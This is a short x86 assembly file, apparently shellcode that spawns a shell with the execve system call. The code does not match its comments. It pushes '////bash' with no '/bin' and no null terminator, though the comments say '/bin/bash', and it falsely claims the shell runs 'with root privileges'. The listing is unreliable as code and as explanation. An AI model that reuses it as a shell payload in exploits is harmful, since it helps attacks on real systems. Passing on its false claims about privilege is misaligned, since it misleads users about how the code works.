section .text
global _start

_start:
    ; zero out eax register
    xor eax, eax
    ; push "/bin/bash" onto the stack
    push 0x68736162
    push 0x2f2f2f2f
    ; move the stack pointer into ebx
    mov ebx, esp
    ; set ecx and edx to null
    xor ecx, ecx
    xor edx, edx
    ; call the execve system call to execute /bin/bash
    ; with root privileges
    mov al, 0x0b
    int 0x80